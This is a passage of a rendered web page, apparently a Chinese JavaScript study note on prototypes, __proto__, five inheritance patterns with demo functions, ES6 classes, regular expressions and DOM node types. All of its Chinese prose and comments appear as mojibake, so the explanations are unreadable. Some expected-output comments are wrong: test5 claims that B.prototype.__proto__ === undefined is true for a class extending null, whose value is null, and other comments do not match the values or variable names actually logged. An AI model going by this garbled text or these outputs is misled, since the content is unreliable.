</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br><span>50</span><br><span>51</span><br><span>52</span><br><span>53</span><br><span>54</span><br><span>55</span><br><span>56</span><br><span>57</span><br><span>58</span><br><span>59</span><br><span>60</span><br><span>61</span><br><span>62</span><br><span>63</span><br><span>64</span><br><span>65</span><br><span>66</span><br><span>67</span><br><span>68</span><br><span>69</span><br><span>70</span><br><span>71</span><br><span>72</span><br><span>73</span><br><span>74</span><br><span>75</span><br><span>76</span><br><span>77</span><br><span>78</span><br><span>79</span><br><span>80</span><br><span>81</span><br><span>82</span><br><span>83</span><br><span>84</span><br><span>85</span><br><span>86</span><br><span>87</span><br><span>88</span><br><span>89</span><br><span>90</span><br><span>91</span><br><span>92</span><br><span>93</span><br><span>94</span><br><span>95</span><br><span>96</span><br><span>97</span><br><span>98</span><br><span>99</span><br><span>100</span><br><span>101</span><br><span>102</span><br><span>103</span><br><span>104</span><br><span>105</span><br><span>106</span><br><span>107</span><br><span>108</span><br><span>109</span><br><span>110</span><br><span>111</span><br></div></div><p><strong>prototypeå’Œ__proto__çš„åŒºåˆ«</strong></p>
<ul>
<li>prototypeå±æ€§åªæœ‰å‡½æ•°å¯¹è±¡æœ‰ï¼Œè€Œ__proto__å±æ€§æ‰€æœ‰å¯¹è±¡éƒ½æœ‰</li>
<li>prototypeæ˜¯ç”±å‡½æ•°å¯¹è±¡æŒ‡å‘åŸå‹å¯¹è±¡ï¼Œè€Œ__proto__å±æ€§æ˜¯ç”±å®ä¾‹æŒ‡å‘å‡½æ•°å¯¹è±¡çš„åŸå‹å¯¹è±¡</li>
</ul>
<p><strong>åŸå‹é“¾</strong>ï¼šå°†çˆ¶ç±»å‹çš„å®ä¾‹ä½œä¸ºå­ç±»å‹çš„åŸå‹å¯¹è±¡ï¼Œä»¥æ­¤æ„æˆçš„é“¾å¼å…³ç³»å«åšåŸå‹é“¾</p>
<p><img src="@source/assets/cs-note/preface/basic/åŸå‹é“¾.png" alt="" loading="lazy"></p>
<h3 id="ç»§æ‰¿" tabindex="-1"> ç»§æ‰¿</h3>
<ol>
<li>
<p>åŸå‹é“¾ç»§æ‰¿</p>
<ul>
<li>ä¼˜ç‚¹ï¼šçˆ¶ç±»åŸå‹å®šä¹‰çš„å±æ€§å’Œæ–¹æ³•å¯ä»¥å¤ç”¨</li>
<li>ç¼ºç‚¹ï¼šå­ç±»å®ä¾‹æ²¡æœ‰è‡ªå·±çš„å±æ€§ï¼Œä¸èƒ½å‘çˆ¶ç±»ä¼ é€’å‚æ•°</li>
</ul>
</li>
<li>
<p>æ„é€ å‡½æ•°ç»§æ‰¿</p>
<ul>
<li>ä¼˜ç‚¹ï¼šå­ç±»å®ä¾‹æœ‰è‡ªå·±çš„å±æ€§ï¼Œå¯ä»¥å‘çˆ¶ç±»ä¼ é€’å‚æ•°ï¼Œè§£å†³åŸå‹é“¾ç»§æ‰¿çš„ç¼ºç‚¹</li>
<li>ç¼ºç‚¹ï¼šçˆ¶ç±»åŸå‹çš„å±æ€§å’Œæ–¹æ³•ä¸å¯å¤ç”¨</li>
</ul>
</li>
<li>
<p>ç»„åˆç»§æ‰¿(æ¨è1)</p>
<ul>
<li>ä¼˜ç‚¹ï¼šåŸå‹çš„å±æ€§å’Œæ–¹æ³•å¯ä»¥å¤ç”¨ï¼Œæ¯ä¸ªå­ç±»å®ä¾‹éƒ½æœ‰è‡ªå·±çš„å±æ€§ã€‚</li>
<li>ç¼ºç‚¹ï¼šçˆ¶ç±»æ„é€ å‡½æ•°è°ƒç”¨äº†ä¸¤æ¬¡ï¼Œå­ç±»åŸå‹çš„ä¸­çš„çˆ¶ç±»å®ä¾‹å±æ€§è¢«å­ç±»å®ä¾‹è¦†ç›–</li>
</ul>
</li>
<li>
<p>å¯„ç”Ÿç»„åˆå¼ç»§æ‰¿(æ¨è2)</p>
<ul>
<li>ä¼˜ç‚¹ï¼šè§£å†³äº†ç»„åˆç»§æ‰¿çš„ç¼ºç‚¹ï¼Œæ•ˆç‡é«˜</li>
<li>ç¼ºç‚¹ï¼šåŸºæœ¬æ²¡æœ‰</li>
</ul>
</li>
<li>
<p>classç»§æ‰¿</p>
<ul>
<li>classç±»ä¸­çš„æ–¹æ³•æ˜¯åŸå‹æ–¹æ³•ä¸ç”¨functionå£°æ˜</li>
<li>å­ç±»çš„__proto__å±æ€§æŒ‡å‘çˆ¶ç±»ï¼Œè¡¨ç¤ºæ„é€ å‡½æ•°çš„ç»§æ‰¿</li>
<li>å­ç±»çš„åŸå‹çš„__proto__æŒ‡å‘çˆ¶ç±»çš„åŸå‹ï¼Œè¡¨ç¤ºæ–¹æ³•çš„ç»§æ‰¿</li>
<li>classç±»å¯ä»¥ç»§æ‰¿Objectå’Œnull</li>
</ul>
</li>
</ol>
<p><strong>ES6 ä¸­ class ä¸æ„é€ å‡½æ•°çš„å…³ç³»</strong></p>
<p><strong>æ„é€ å‡½æ•°</strong>ï¼šé€šè¿‡  new å‡½æ•°åæ¥å®ä¾‹åŒ–å¯¹è±¡çš„å‡½æ•°å«æ„é€ å‡½æ•°ã€‚ä»»ä½•çš„å‡½æ•°éƒ½å¯ä»¥ä½œä¸ºæ„é€ å‡½æ•°å­˜åœ¨ã€‚ä¹‹æ‰€ä»¥æœ‰æ„é€ å‡½æ•°ä¸æ™®é€šå‡½æ•°ä¹‹åˆ†ï¼Œä¸»è¦ä»åŠŸèƒ½ä¸Šè¿›è¡ŒåŒºåˆ«çš„ï¼Œæ„é€ å‡½æ•°çš„ä¸»è¦åŠŸèƒ½ä¸ºåˆå§‹åŒ–å¯¹è±¡ï¼Œç‰¹ç‚¹æ˜¯å’Œnew ä¸€èµ·ä½¿ç”¨ã€‚newå°±æ˜¯åœ¨åˆ›å»ºå¯¹è±¡ï¼Œä»æ— åˆ°æœ‰ï¼Œæ„é€ å‡½æ•°å°±æ˜¯åœ¨ä¸ºåˆå§‹åŒ–çš„å¯¹è±¡æ·»åŠ å±æ€§å’Œæ–¹æ³•ã€‚æ„é€ å‡½æ•°å®šä¹‰æ—¶é¦–å­—æ¯å¤§å†™ï¼ˆè§„èŒƒï¼‰ã€‚</p>
<p>class ä¸ºæ„é€ å‡½æ•°çš„è¯­æ³•ç³–ï¼Œå³ class çš„æœ¬è´¨æ˜¯æ„é€ å‡½æ•°ã€‚class çš„ç»§æ‰¿ extends  æœ¬è´¨ä¸ºæ„é€ å‡½æ•°çš„åŸå‹é“¾çš„ç»§æ‰¿ã€‚</p>
<div><pre><code>

<span>function</span> <span>test1</span><span>(</span><span>)</span> <span>{</span>
    <span>function</span> <span>SuperType</span><span>(</span><span>)</span> <span>{</span>
        <span>this</span><span>.</span>city <span>=</span> <span>[</span><span>"åŒ—äº¬"</span><span>,</span> <span>"ä¸Šæµ·"</span><span>,</span> <span>"å¤©æ´¥"</span><span>]</span><span>;</span>
        <span>this</span><span>.</span>property <span>=</span> <span>true</span><span>;</span>
    <span>}</span>
    <span>SuperType</span><span>.</span>prototype <span>=</span> <span>{</span>
        <span>constructor</span><span>:</span> SuperType<span>,</span> <span>// ä¿æŒæ„é€ å‡½æ•°å’ŒåŸå‹å¯¹è±¡çš„å®Œæ•´æ€§</span>
        <span>age</span><span>:</span> <span>15</span><span>,</span>
        <span>getSuperValue</span><span>:</span> <span>function</span> <span>(</span><span>)</span> <span>{</span>
            <span>return</span> <span>this</span><span>.</span>property<span>;</span>
        <span>}</span>
    <span>}</span><span>;</span>
    <span>function</span> <span>SubType</span><span>(</span><span>)</span> <span>{</span>
        <span>this</span><span>.</span>property <span>=</span> <span>false</span><span>;</span>
    <span>}</span>

    <span>SubType</span><span>.</span>prototype <span>=</span> <span>{</span>
        <span>constructor</span><span>:</span> SuperType<span>,</span>
        <span>getSubType</span><span>:</span> <span>function</span> <span>(</span><span>)</span> <span>{</span>
            <span>return</span> <span>this</span><span>.</span>property<span>;</span>
        <span>}</span>
    <span>}</span><span>;</span>

    <span>// é‡å†™å­ç±»çš„åŸå‹æŒ‡å‘çˆ¶ç±»çš„å®ä¾‹ï¼šç»§æ‰¿çˆ¶ç±»çš„åŸå‹</span>
    <span>SubType</span><span>.</span>prototype <span>=</span> <span>new</span> <span>SuperType</span><span>(</span><span>)</span><span>;</span>

    <span>// ä¼˜ç‚¹éªŒè¯</span>
    <span>let</span> son <span>=</span> <span>new</span> <span>SubType</span><span>(</span><span>)</span><span>;</span>
    console<span>.</span><span>log</span><span>(</span>son<span>.</span>age<span>,</span> son<span>.</span>property<span>)</span><span>;</span> <span>// 15</span>
    console<span>.</span><span>log</span><span>(</span>son<span>.</span><span>getSuperValue</span><span>(</span><span>)</span><span>)</span><span>;</span> <span>// false</span>

    <span>// ç¼ºç‚¹éªŒè¯</span>
    <span>let</span> instance1 <span>=</span> <span>new</span> <span>SubType</span><span>(</span><span>)</span><span>;</span>
    instance1<span>.</span>city<span>.</span><span>push</span><span>(</span><span>"é‡åº†"</span><span>)</span><span>;</span>
    console<span>.</span><span>log</span><span>(</span>instance1<span>.</span>city<span>)</span><span>;</span> <span>// ["åŒ—äº¬", "ä¸Šæµ·", "å¤©æ´¥", "é‡åº†"]</span>

    <span>let</span> instance2 <span>=</span> <span>new</span> <span>SubType</span><span>(</span><span>)</span><span>;</span>
    console<span>.</span><span>log</span><span>(</span>instance2<span>.</span>city<span>)</span><span>;</span> <span>// ["åŒ—äº¬", "ä¸Šæµ·", "å¤©æ´¥", "é‡åº†"]</span>

<span>}</span>
<span>test1</span><span>(</span><span>)</span><span>;</span>


<span>/**
 *   2. æ„é€ å‡½æ•°ç»§æ‰¿
 */</span>
<span>function</span> <span>test2</span><span>(</span><span>)</span> <span>{</span>
    <span>function</span> <span>SuperType</span><span>(</span><span>name</span><span>)</span> <span>{</span>
        <span>this</span><span>.</span>name <span>=</span> name<span>;</span>
        <span>this</span><span>.</span>city <span>=</span> <span>[</span><span>"åŒ—äº¬"</span><span>,</span> <span>"ä¸Šæµ·"</span><span>,</span> <span>"å¤©æ´¥"</span><span>]</span>
    <span>}</span>
    <span>SuperType</span><span>.</span>prototype <span>=</span> <span>{</span>
        <span>constructor</span><span>:</span> SuperType<span>,</span>
        <span>age</span><span>:</span> <span>18</span><span>,</span>
        <span>showInfo</span><span>:</span> <span>function</span> <span>(</span><span>)</span> <span>{</span>
            <span>return</span> <span>this</span><span>.</span>name<span>;</span>
        <span>}</span>
    <span>}</span><span>;</span>

    <span>function</span> <span>SubType</span><span>(</span><span>)</span> <span>{</span>
        <span>// çˆ¶ç±»è°ƒç”¨call()æˆ–è€…apply()æ–¹æ³•å’Œå­ç±»å…±ç”¨åŒä¸€ä¸ªthisï¼Œå®ç°å­ç±»å®ä¾‹å±æ€§çš„ç»§æ‰¿</span>
        <span>SuperType</span><span>.</span><span>call</span><span>(</span><span>this</span><span>,</span> <span>"å¼ ä¸‰"</span><span>)</span><span>;</span>
    <span>}</span>

    <span>// ä¼˜ç‚¹éªŒè¯</span>
    <span>let</span> instance <span>=</span> <span>new</span> <span>SubType</span><span>(</span><span>)</span><span>;</span>
    instance<span>.</span>city<span>.</span><span>push</span><span>(</span><span>"é‡åº†"</span><span>)</span><span>;</span>
    console<span>.</span><span>log</span><span>(</span>instance<span>.</span>city<span>)</span><span>;</span> <span>// ["åŒ—äº¬", "ä¸Šæµ·", "å¤©æ´¥", "é‡åº†"]</span>

    <span>let</span> instance1 <span>=</span> <span>new</span> <span>SubType</span><span>(</span><span>)</span><span>;</span>
    console<span>.</span><span>log</span><span>(</span>instance1<span>.</span>city<span>)</span><span>;</span> <span>// ["åŒ—äº¬", "ä¸Šæµ·", "å¤©æ´¥"]</span>

    <span>// ç¼ºç‚¹éªŒè¯</span>
    console<span>.</span><span>log</span><span>(</span>instance<span>.</span>age<span>)</span><span>;</span> <span>// undefined</span>
    instance<span>.</span><span>showInfo</span><span>(</span><span>)</span><span>;</span> <span>// son.showInfo is not a function</span>
<span>}</span>
<span>// test2();</span>


<span>/**
 *   3. ç»„åˆç»§æ‰¿
 */</span>
<span>function</span> <span>test3</span><span>(</span><span>)</span> <span>{</span>
    <span>function</span> <span>SuperType</span><span>(</span><span>name</span><span>)</span> <span>{</span>
        <span>this</span><span>.</span>name <span>=</span> name<span>;</span>
        <span>this</span><span>.</span>city <span>=</span> <span>[</span><span>"åŒ—äº¬"</span><span>,</span> <span>"ä¸Šæµ·"</span><span>,</span> <span>"å¤©æ´¥"</span><span>]</span>
    <span>}</span>
    <span>SuperType</span><span>.</span>prototype <span>=</span> <span>{</span>
        <span>constructor</span><span>:</span> SuperType<span>,</span>
        <span>showInfo</span><span>:</span> <span>function</span> <span>(</span><span>)</span> <span>{</span>
            console<span>.</span><span>log</span><span>(</span><span>this</span><span>.</span>name <span>+</span> <span>"ä»Šå¹´"</span> <span>+</span> <span>this</span><span>.</span>age <span>+</span> <span>"å²äº†"</span><span>)</span><span>;</span>
        <span>}</span>
    <span>}</span><span>;</span>

    <span>function</span> <span>SubType</span><span>(</span><span>name<span>,</span> age</span><span>)</span> <span>{</span>
        <span>// 1. é€šè¿‡æ„é€ æ–¹æ³•ç»§æ‰¿å®ç°å®ä¾‹å±æ€§çš„ç»§æ‰¿</span>
        <span>SuperType</span><span>.</span><span>call</span><span>(</span><span>this</span><span>,</span> name<span>)</span><span>;</span>
        <span>this</span><span>.</span>age <span>=</span> age<span>;</span>
    <span>}</span>

    <span>// 2. é€šè¿‡åŸå‹é“¾ç»§æ‰¿å®ç°åŸå‹æ–¹æ³•çš„ç»§æ‰¿</span>
    <span>SubType</span><span>.</span>prototype <span>=</span> <span>new</span> <span>SuperType</span><span>(</span><span>)</span><span>;</span>

    <span>// ä¼˜ç‚¹éªŒè¯</span>
    <span>let</span> instance <span>=</span> <span>new</span> <span>SubType</span><span>(</span><span>"å¼ ä¸‰"</span><span>,</span> <span>15</span><span>)</span><span>;</span>
    instance<span>.</span><span>showInfo</span><span>(</span><span>)</span><span>;</span> <span>// å¼ ä¸‰ä»Šå¹´15å²äº†</span>

    <span>let</span> instance1 <span>=</span> <span>new</span> <span>SubType</span><span>(</span><span>)</span><span>;</span>
    instance1<span>.</span>city<span>.</span><span>push</span><span>(</span><span>"é‡åº†"</span><span>)</span><span>;</span>
    console<span>.</span><span>log</span><span>(</span>instance1<span>.</span>city<span>)</span><span>;</span> <span>// ["åŒ—äº¬", "ä¸Šæµ·", "å¤©æ´¥", "é‡åº†"]</span>

    <span>let</span> instance2 <span>=</span> <span>new</span> <span>SubType</span><span>(</span><span>)</span><span>;</span>
    console<span>.</span><span>log</span><span>(</span>instance2<span>.</span>city<span>)</span><span>;</span> <span>// ["åŒ—äº¬", "ä¸Šæµ·", "å¤©æ´¥"]</span>

<span>}</span>
<span>// test3();</span>


<span>/*
 *   4. å¯„ç”Ÿç»„åˆå¼ç»§æ‰¿
 */</span>
<span>function</span> <span>test4</span><span>(</span><span>)</span> <span>{</span>
    <span>function</span> <span>inheritPrototype</span><span>(</span><span>subType<span>,</span> superType</span><span>)</span> <span>{</span>
        <span>// 1. ç»§æ‰¿çˆ¶ç±»çš„åŸå‹</span>
        <span>var</span> prototype <span>=</span> Object<span>.</span><span>create</span><span>(</span>superType<span>.</span>prototype<span>)</span><span>;</span>
        <span>// 2. é‡å†™è¢«æ±¡æŸ“çš„construct</span>
        prototype<span>.</span>constructor <span>=</span> subType<span>;</span>
        <span>// 3. é‡å†™å­ç±»çš„åŸå‹</span>
        subType<span>.</span>prototype <span>=</span> prototype<span>;</span>
    <span>}</span>
    <span>function</span> <span>SuperType</span><span>(</span><span>name</span><span>)</span> <span>{</span>
        <span>this</span><span>.</span>name <span>=</span> name<span>;</span>
        <span>this</span><span>.</span>city <span>=</span> <span>[</span><span>"åŒ—äº¬"</span><span>,</span> <span>"ä¸Šæµ·"</span><span>,</span> <span>"å¤©æ´¥"</span><span>]</span><span>;</span>
    <span>}</span>

    <span>SuperType</span><span>.</span>prototype<span>.</span><span>sayName</span> <span>=</span> <span>function</span> <span>(</span><span>)</span> <span>{</span>
        console<span>.</span><span>log</span><span>(</span><span>this</span><span>.</span>name<span>)</span><span>;</span>
    <span>}</span><span>;</span>

    <span>function</span> <span>SubType</span><span>(</span><span>name<span>,</span> age</span><span>)</span> <span>{</span>
        <span>SuperType</span><span>.</span><span>call</span><span>(</span><span>this</span><span>,</span> name<span>)</span><span>;</span>
        <span>this</span><span>.</span>age <span>=</span> age<span>;</span>
    <span>}</span>

    <span>// å°†çˆ¶ç±»åŸå‹æŒ‡å‘å­ç±»</span>
    <span>inheritPrototype</span><span>(</span>SubType<span>,</span> SuperType<span>)</span><span>;</span>

    <span>SubType</span><span>.</span>prototype<span>.</span><span>sayAge</span> <span>=</span> <span>function</span> <span>(</span><span>)</span> <span>{</span>
        console<span>.</span><span>log</span><span>(</span><span>this</span><span>.</span>age<span>)</span><span>;</span>
    <span>}</span>

    <span>// ä¼˜ç‚¹éªŒè¯</span>
    <span>let</span> instance <span>=</span> <span>new</span> <span>SubType</span><span>(</span><span>"å¼ ä¸‰"</span><span>,</span> <span>15</span><span>)</span><span>;</span>
    instance<span>.</span><span>sayName</span><span>(</span><span>)</span><span>;</span> <span>// å¼ ä¸‰</span>

    <span>let</span> instance1 <span>=</span> <span>new</span> <span>SubType</span><span>(</span><span>)</span><span>;</span>
    instance1<span>.</span>city<span>.</span><span>push</span><span>(</span><span>"é‡åº†"</span><span>)</span><span>;</span>
    console<span>.</span><span>log</span><span>(</span>instance1<span>.</span>city<span>)</span><span>;</span> <span>// ["åŒ—äº¬", "ä¸Šæµ·", "å¤©æ´¥", "é‡åº†"]</span>

    <span>let</span> instance2 <span>=</span> <span>new</span> <span>SubType</span><span>(</span><span>)</span><span>;</span>
    console<span>.</span><span>log</span><span>(</span>instance2<span>.</span>city<span>)</span><span>;</span> <span>// ["åŒ—äº¬", "ä¸Šæµ·", "å¤©æ´¥"]</span>
<span>}</span>
<span>// test4();</span>

<span>function</span> <span>test5</span><span>(</span><span>)</span> <span>{</span>
    <span>class</span> <span>SuperType</span> <span>{</span>
        <span>// æ„é€ æ–¹æ³•ï¼Œåªèƒ½æœ‰ä¸€ä¸ª</span>
        <span>constructor</span><span>(</span><span>name<span>,</span> age</span><span>)</span> <span>{</span>
            <span>this</span><span>.</span>name <span>=</span> name<span>;</span>
            <span>this</span><span>.</span>age <span>=</span> age<span>;</span>
        <span>}</span>

        <span>toString</span><span>(</span><span>)</span> <span>{</span>
            console<span>.</span><span>log</span><span>(</span><span>this</span><span>.</span>name <span>+</span> <span>"ä»Šå¹´"</span> <span>+</span> <span>this</span><span>.</span>age <span>+</span> <span>"å²äº†"</span><span>)</span><span>;</span>
        <span>}</span>
    <span>}</span>

    <span>class</span> <span>SubType</span> <span>extends</span> <span>SuperType</span> <span>{</span>
        <span>// å­ç±»å¿…é¡»ç»§æ‰¿çˆ¶ç±»æ„é€ æ–¹æ³•</span>
        <span>constructor</span><span>(</span><span>name<span>,</span> age</span><span>)</span> <span>{</span>
            <span>// è°ƒç”¨çˆ¶ç±»æ„é€ æ–¹æ³•ï¼Œåªèƒ½åœ¨ç¬¬ä¸€è¡Œ</span>
            <span>super</span><span>(</span>name<span>,</span> age<span>)</span><span>;</span>
        <span>}</span>
    <span>}</span>

    <span>var</span> obj <span>=</span> <span>new</span> <span>SubType</span><span>(</span><span>"å¼ ä¸‰"</span><span>,</span> <span>15</span><span>)</span><span>;</span>
    obj<span>.</span><span>toString</span><span>(</span><span>)</span><span>;</span> <span>// å¼ ä¸‰ä»Šå¹´15å²äº†</span>
    <span>// éªŒè¯ç¬¬ä¸€æ¡</span>
    console<span>.</span><span>log</span><span>(</span>obj<span>.</span>toString <span>===</span> <span>SuperType</span><span>.</span>prototype<span>.</span>toString<span>)</span><span>;</span> <span>// true</span>
    <span>// éªŒè¯ç¬¬äºŒæ¡</span>
    console<span>.</span><span>log</span><span>(</span>SubType<span>.</span>__proto__<span>)</span><span>;</span> <span>// class SuperType</span>
    <span>// éªŒè¯ç¬¬ä¸‰æ¡</span>
    console<span>.</span><span>log</span><span>(</span><span>SubType</span><span>.</span>prototype<span>.</span>__proto__<span>)</span><span>;</span> <span>// {constructor: Æ’, toString: Æ’}</span>
    <span>// éªŒè¯ç¬¬å››æ¡</span>
    <span>class</span> <span>A</span> <span>extends</span> <span>Object</span> <span>{</span> <span>}</span>
    <span>class</span> <span>B</span> <span>extends</span> <span>null</span><span>{</span> <span>}</span>
    console<span>.</span><span>log</span><span>(</span><span>A</span><span>.</span>__proto__ <span>===</span> Object<span>)</span><span>;</span> <span>// true</span>
    console<span>.</span><span>log</span><span>(</span><span>A</span><span>.</span>prototype<span>.</span>__proto__ <span>===</span> <span>Object</span><span>.</span>prototype<span>)</span><span>;</span> <span>// true</span>
    console<span>.</span><span>log</span><span>(</span><span>B</span><span>.</span>__proto__ <span>===</span> <span>Function</span><span>.</span>prototype<span>)</span><span>;</span> <span>// true</span>
    console<span>.</span><span>log</span><span>(</span><span>B</span><span>.</span>prototype<span>.</span>__proto__ <span>===</span> <span>undefined</span><span>)</span><span>;</span> <span>// true</span>
<span>}</span>
<span>// test5()</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br><span>50</span><br><span>51</span><br><span>52</span><br><span>53</span><br><span>54</span><br><span>55</span><br><span>56</span><br><span>57</span><br><span>58</span><br><span>59</span><br><span>60</span><br><span>61</span><br><span>62</span><br><span>63</span><br><span>64</span><br><span>65</span><br><span>66</span><br><span>67</span><br><span>68</span><br><span>69</span><br><span>70</span><br><span>71</span><br><span>72</span><br><span>73</span><br><span>74</span><br><span>75</span><br><span>76</span><br><span>77</span><br><span>78</span><br><span>79</span><br><span>80</span><br><span>81</span><br><span>82</span><br><span>83</span><br><span>84</span><br><span>85</span><br><span>86</span><br><span>87</span><br><span>88</span><br><span>89</span><br><span>90</span><br><span>91</span><br><span>92</span><br><span>93</span><br><span>94</span><br><span>95</span><br><span>96</span><br><span>97</span><br><span>98</span><br><span>99</span><br><span>100</span><br><span>101</span><br><span>102</span><br><span>103</span><br><span>104</span><br><span>105</span><br><span>106</span><br><span>107</span><br><span>108</span><br><span>109</span><br><span>110</span><br><span>111</span><br><span>112</span><br><span>113</span><br><span>114</span><br><span>115</span><br><span>116</span><br><span>117</span><br><span>118</span><br><span>119</span><br><span>120</span><br><span>121</span><br><span>122</span><br><span>123</span><br><span>124</span><br><span>125</span><br><span>126</span><br><span>127</span><br><span>128</span><br><span>129</span><br><span>130</span><br><span>131</span><br><span>132</span><br><span>133</span><br><span>134</span><br><span>135</span><br><span>136</span><br><span>137</span><br><span>138</span><br><span>139</span><br><span>140</span><br><span>141</span><br><span>142</span><br><span>143</span><br><span>144</span><br><span>145</span><br><span>146</span><br><span>147</span><br><span>148</span><br><span>149</span><br><span>150</span><br><span>151</span><br><span>152</span><br><span>153</span><br><span>154</span><br><span>155</span><br><span>156</span><br><span>157</span><br><span>158</span><br><span>159</span><br><span>160</span><br><span>161</span><br><span>162</span><br><span>163</span><br><span>164</span><br><span>165</span><br><span>166</span><br><span>167</span><br><span>168</span><br><span>169</span><br><span>170</span><br><span>171</span><br><span>172</span><br><span>173</span><br><span>174</span><br><span>175</span><br><span>176</span><br><span>177</span><br><span>178</span><br><span>179</span><br><span>180</span><br><span>181</span><br><span>182</span><br><span>183</span><br><span>184</span><br><span>185</span><br><span>186</span><br><span>187</span><br><span>188</span><br><span>189</span><br><span>190</span><br><span>191</span><br><span>192</span><br><span>193</span><br><span>194</span><br><span>195</span><br><span>196</span><br><span>197</span><br><span>198</span><br><span>199</span><br><span>200</span><br><span>201</span><br><span>202</span><br><span>203</span><br><span>204</span><br></div></div><h2 id="æ­£åˆ™è¡¨è¾¾å¼" tabindex="-1"> æ­£åˆ™è¡¨è¾¾å¼</h2>
<p><strong>æ­£åˆ™è¡¨è¾¾å¼</strong>(regular expression)æè¿°äº†ä¸€ç§å­—ç¬¦ä¸²åŒ¹é…çš„æ¨¡å¼ï¼ˆpatternï¼‰ï¼Œé€šå¸¸è¢«ç”¨æ¥æ£€ç´¢ã€æ›¿æ¢é‚£äº›ç¬¦åˆæŸä¸ªæ¨¡å¼(è§„åˆ™)çš„æ–‡æœ¬ã€‚</p>
<p><img src="@source/assets/cs-note/preface/basic/regular-expression.png" alt="" loading="lazy"></p>
<h1 id="javascript-dom" tabindex="-1"> JavaScript DOM</h1>
<h2 id="ç®€ä»‹" tabindex="-1"> ç®€ä»‹</h2>
<p><strong>æ–‡æ¡£å¯¹è±¡æ¨¡å‹</strong>ï¼ˆDocument Object Modelï¼Œç®€ç§°DOMï¼‰ï¼Œæ˜¯é’ˆå¯¹HTMLå’ŒXMLæ–‡æ¡£çš„ä¸€ä¸ªAPIï¼ˆåº”ç”¨ç¨‹åºæ¥å£ï¼‰ï¼Œå°† HTML æ–‡æ¡£å‘ˆç°ä¸ºå¸¦æœ‰å…ƒç´ ã€å±æ€§å’Œæ–‡æœ¬çš„æ ‘ç»“æ„ï¼Œå³èŠ‚ç‚¹æ ‘</p>
<p><strong>ä½œç”¨</strong>ï¼šJavaScripté€šè¿‡DOMèƒ½å¤Ÿæ”¹å˜é¡µé¢ä¸­æ‰€æœ‰çš„HTML å…ƒç´ ã€å±æ€§å’Œ CSS æ ·å¼ï¼Œå¹¶å¯¹é¡µé¢ä¸­æ‰€æœ‰äº‹ä»¶åšå‡ºå“åº”ã€‚</p>
<p><strong>ç»“æ„å›¾</strong></p>
<p><img src="@source/assets/cs-note/preface/basic/js-domç»“æ„.png" alt="" loading="lazy"></p>
<h2 id="èŠ‚ç‚¹æ ‘" tabindex="-1"> èŠ‚ç‚¹æ ‘</h2>
<h3 id="èŠ‚ç‚¹ç±»å‹åŠå±æ€§" tabindex="-1"> èŠ‚ç‚¹ç±»å‹åŠå±æ€§</h3>
<p><img src="@source/assets/cs-note/preface/basic/js-domèŠ‚ç‚¹ç±»å‹åŠå±æ€§.png" alt="" loading="lazy"></p>
<h3 id="æ–‡æ¡£èŠ‚ç‚¹-documentå¯¹è±¡" tabindex="-1"> æ–‡æ¡£èŠ‚ç‚¹(Documentå¯¹è±¡)</h3>
<p>documentç±»å‹å±æ€§
<img src="@source/assets/cs-note/preface/basic/js-documentç±»å‹å±æ€§.png" alt="" loading="lazy"></p>
<p>documentç±»å‹æ–¹æ³•
<img src="@source/assets/cs-note/preface/basic/js-documentç±»å‹æ–¹æ³•.png" alt="" loading="lazy"></p>
<h3 id="å…ƒç´ èŠ‚ç‚¹-elementå¯¹è±¡" tabindex="-1"> å…ƒç´ èŠ‚ç‚¹(Elementå¯¹è±¡)</h3>
<p><img src="@source/assets/cs-note/preface/basic/js-Elementå¯¹è±¡.png" alt="" loading="lazy"></p>
<h3 id="å±æ€§èŠ‚ç‚¹-attrå¯¹è±¡" tabindex="-1"> å±æ€§èŠ‚ç‚¹(Attrå¯¹è±¡)</h3>
<p><img src="@source/assets/cs-note/preface/basic/js-Attrå¯¹è±¡.png" alt="" loading="lazy"></p>
<h3 id="æ–‡æœ¬èŠ‚ç‚¹-text" tabindex="-1"> æ–‡æœ¬èŠ‚ç‚¹(Text)</h3>
<p><img src="@source/assets/cs-note/preface/basic/js-Text.png" alt="" loading="lazy"></p>
<h2 id="äº‹ä»¶" tabindex="-1"> äº‹ä»¶</h2>
<p><strong>æ¦‚è¿°</strong>ï¼šäº‹ä»¶ä¸€èˆ¬æ˜¯ç”¨äºæµè§ˆå™¨å’Œç”¨æˆ·æ“ä½œè¿›è¡Œäº¤äº’ï¼Œå½“ç”¨æˆ·æ‰§è¡ŒæŸäº›æ“ä½œçš„æ—¶å€™æ‰ä¼šæ‰§è¡Œç‰¹å®šçš„ä»£ç ï¼Œä¾‹å¦‚å•å‡»å›¾ç‰‡ç­‰</p>
<h3 id="äº‹ä»¶æµ" tabindex="-1"> äº‹ä»¶æµ</h3>
